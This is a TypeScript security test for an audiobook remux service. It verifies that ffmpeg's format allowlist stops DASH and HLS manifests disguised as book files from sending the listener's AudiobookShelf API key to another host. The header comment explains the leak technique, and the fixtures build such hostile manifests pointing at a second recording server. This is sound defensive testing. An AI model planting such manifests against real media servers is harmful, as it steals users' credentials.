// SPDX-FileCopyrightText: 2026 Denis Arnst (Sapd)
// SPDX-License-Identifier: AGPL-3.0-only

/**
 * The remux hands ffmpeg an AudiobookShelf URL plus the LISTENER's ABS key as an
 * `Authorization` header, and ffmpeg picks the demuxer from the body. A book file
 * whose content is a manifest (DASH `<MPD`, IMF — both detected by content alone
 * — or HLS) makes ffmpeg fetch the segments the manifest names, from ANY host,
 * and the http layer forwards the same `-headers` to each of them: the key leaks
 * to whoever wrote the manifest. Measured on the production jellyfin-ffmpeg
 * 7.1.4 (preprod, 2026-09-26): an MPD served as a book sent
 * `Authorization: Bearer <key>` to a second host.
 *
 * `-protocol_whitelist` cannot stop that — the second host is plain http, which
 * the input itself needs — and `file://` is already refused without one (an
 * http input's nested opens inherit the http protocol's default whitelist,
 * measured). `-format_whitelist` does: the manifest demuxers are never selected.
 *
 * REAL ffmpeg (FFMPEG_PATH, the pinned jellyfin-ffmpeg in CI) against two local
 * HTTP servers: the "AudiobookShelf" upstream and a second host that records
 * every request it receives. The DASH case needs a build with the `dash`
 * demuxer (libxml2) and skips, saying so, on one without it; the HLS case runs
 * everywhere and exercises the same nested-open path.
 */

import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { execFileSync } from 'node:child_process';
import { createReadStream, statSync } from 'node:fs';
import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { createServer, type IncomingMessage, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { startAudiobookRemux } from './audiobook-remux.service.js';

const FFMPEG = process.env.FFMPEG_PATH ?? 'ffmpeg';
const API_KEY = 'listener-abs-key';

function demuxers(): string {
    try {
        return execFileSync(FFMPEG, ['-hide_banner', '-demuxers'], { encoding: 'utf-8' });
    } catch {
        return '';
    }
}
const DEMUXERS = demuxers();
const HAS_FFMPEG = DEMUXERS !== '';
const HAS_DASH = /^\s*D\s+dash\s/m.test(DEMUXERS);

/** Serve files from `root` by basename, with Range, recording each request. */
function fileServer(root: string, seen: IncomingMessage[]): Server {
    return createServer((req, res) => {
        seen.push(req);
        const name = decodeURIComponent((req.url ?? '').split('?')[0].split('/').pop() ?? '');
        const path = join(root, name);
        let size: number;
        try {
            size = statSync(path).size;
        } catch {
            res.writeHead(404).end();
            return;
        }
        const type = name.endsWith('.m3u8') ? 'application/vnd.apple.mpegurl' : 'audio/mp4';
        const m = /bytes=(\d*)-(\d*)/.exec(req.headers.range ?? '');
        if (!m) {
            res.writeHead(200, { 'Content-Type': type, 'Content-Length': size });
            createReadStream(path).pipe(res);
            return;
        }
        const start = m[1] ? Number(m[1]) : 0;
        const end = m[2] ? Number(m[2]) : size - 1;
        if (start >= size) {
            res.writeHead(416, { 'Content-Range': `bytes */${size}` }).end();
            return;
        }
        res.writeHead(206, {
            'Content-Type': type,
            'Content-Length': end - start + 1,
            'Content-Range': `bytes ${start}-${end}/${size}`,
        });
        createReadStream(path, { start, end }).pipe(res);
    });
}

async function listen(server: Server): Promise<string> {
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
    return `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
}

/** Run one remux to completion: output bytes and the exit verdict. */
async function remux(url: string, startSeconds = 0) {
    let exit: { ok: boolean; code: number | null; error?: string } | undefined;
    const exited = new Promise<void>((resolve) => {
        const stream = startAudiobookRemux(
            { url, apiKey: API_KEY, startSeconds },
            {
                ffmpegPath: FFMPEG,
                onExit: (r) => {
                    exit = r;
                    resolve();
                },
            },
        );
        void (async () => {
            let bytes = 0;
            for await (const chunk of stream.body) bytes += chunk.byteLength;
            outputBytes = bytes;
        })();
    });
    let outputBytes = 0;
    await exited;
    // Let the body drain its last chunk after the process closed.
    await new Promise((r) => setTimeout(r, 50));
    return { exit: exit!, outputBytes };
}

describe.skipIf(!HAS_FFMPEG)('audiobook remux — manifest bodies never reach another host', () => {
    let dir: string;
    const upstreamSeen: IncomingMessage[] = [];
    const otherSeen: IncomingMessage[] = [];
    let upstream: Server;
    let other: Server;
    let upstreamUrl: string;
    let otherUrl: string;

    beforeAll(async () => {
        dir = await mkdtemp(join(tmpdir(), 'lumastra-remux-fmt-'));
        // What the remux exists for: E-AC-3 in an .m4b.
        execFileSync(FFMPEG, [
            ...['-hide_banner', '-loglevel', 'error', '-f', 'lavfi'],
            ...['-i', 'sine=frequency=440:duration=6', '-ac', '2', '-c:a', 'eac3'],
            ...['-f', 'mp4', join(dir, 'book.m4b')],
        ]);
        execFileSync(FFMPEG, [
            ...['-hide_banner', '-loglevel', 'error', '-f', 'lavfi'],
            ...['-i', 'sine=frequency=440:duration=6', '-c:a', 'aac', '-f', 'mpegts'],
            join(dir, 'seg.ts'),
        ]);

        // AudiobookShelf serves `.awb` as audio, and ffmpeg demuxes a real one
        // (with its `#!AMR-WB` storage header) as `amr`, not the headerless raw
        // `amrwb`. Hand-built: AMR encoders are not in every build. 150 frames
        // of mode 8 (23.85 kbit/s, 60 data bytes each) = 3 s.
        await writeFile(
            join(dir, 'book.awb'),
            Buffer.concat([
                Buffer.from('#!AMR-WB\n'),
                ...Array.from({ length: 150 }, () => Buffer.from([0x44, ...new Array(60).fill(0)])),
            ]),
        );

        // A real container no hand-written audio list thought of: WavPack.
        // The remux takes the running binary's own demuxer list, so it plays.
        execFileSync(FFMPEG, [
            ...['-hide_banner', '-loglevel', 'error', '-f', 'lavfi'],
            ...['-i', 'sine=frequency=440:duration=6', '-ac', '2', '-c:a', 'wavpack'],
            join(dir, 'book.wv'),
        ]);

        upstream = fileServer(dir, upstreamSeen);
        other = fileServer(dir, otherSeen);
        upstreamUrl = await listen(upstream);
        otherUrl = await listen(other);

        await writeFile(
            join(dir, 'book.m3u8'),
            '#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:6\n#EXTINF:6.0,\n' +
                `${otherUrl}/seg.ts\n#EXT-X-ENDLIST\n`,
        );
        await writeFile(
            join(dir, 'dash-book.m4b'),
            '<?xml version="1.0"?>\n' +
                '<MPD xmlns="urn:mpeg:dash:schema:mpd:2011" type="static" ' +
                'mediaPresentationDuration="PT6S" minBufferTime="PT1S" ' +
                'profiles="urn:mpeg:dash:profile:isoff-on-demand:2011"><Period>' +
                '<AdaptationSet mimeType="audio/mp4"><Representation id="a" ' +
                `bandwidth="64000" codecs="ec-3"><BaseURL>${otherUrl}/book.m4b</BaseURL>` +
                '</Representation></AdaptationSet></Period></MPD>\n',
        );
    });

    afterAll(async () => {
        await new Promise((r) => upstream.close(r));
        await new Promise((r) => other.close(r));
        await rm(dir, { recursive: true, force: true });
    });

    it('control: a real E-AC-3 .m4b remuxes to AAC, from the head and after a seek', async () => {
        const head = await remux(`${upstreamUrl}/api/items/i1/file/book.m4b`);
        expect(head.exit.ok).toBe(true);
        expect(head.outputBytes).toBeGreaterThan(10_000);

        const seeked = await remux(`${upstreamUrl}/api/items/i1/file/book.m4b`, 3);
        expect(seeked.exit.ok).toBe(true);
        expect(seeked.outputBytes).toBeGreaterThan(5_000);
        expect(seeked.outputBytes).toBeLessThan(head.outputBytes);

        expect(upstreamSeen.every((r) => r.headers.authorization === `Bearer ${API_KEY}`)).toBe(
            true,
        );
    });

    it('control: a real AMR-WB (.awb) book is not refused by the demuxer allowlist', async () => {
        const { exit, outputBytes } = await remux(`${upstreamUrl}/api/items/i1/file/book.awb`);

        expect(exit.error ?? '').not.toMatch(/not on whitelist/);
        expect(exit.ok).toBe(true);
        expect(outputBytes).toBeGreaterThan(0);
    });

    it("control: a real WavPack (.wv) book plays — the list is the binary's own, not hand-written", async () => {
        const { exit, outputBytes } = await remux(`${upstreamUrl}/api/items/i1/file/book.wv`);

        expect(exit.error ?? '').not.toMatch(/not on whitelist/);
        expect(exit.ok).toBe(true);
        expect(outputBytes).toBeGreaterThan(0);
    });

    it('an HLS body naming another host: that host is never contacted', async () => {
        otherSeen.length = 0;

        const { exit, outputBytes } = await remux(`${upstreamUrl}/api/items/i1/file/book.m3u8`);

        expect(otherSeen.map((r) => `${r.url} auth=${r.headers.authorization}`)).toEqual([]);
        expect(exit.ok).toBe(false);
        expect(outputBytes).toBe(0);
    });

    it.skipIf(!HAS_DASH)(
        'a DASH manifest served as the book (content-detected): the key never reaches the named host',
        async () => {
            otherSeen.length = 0;

            const { exit, outputBytes } = await remux(
                `${upstreamUrl}/api/items/i1/file/dash-book.m4b`,
            );

            expect(otherSeen.map((r) => `${r.url} auth=${r.headers.authorization}`)).toEqual([]);
            expect(exit.ok).toBe(false);
            expect(outputBytes).toBe(0);
        },
    );
});
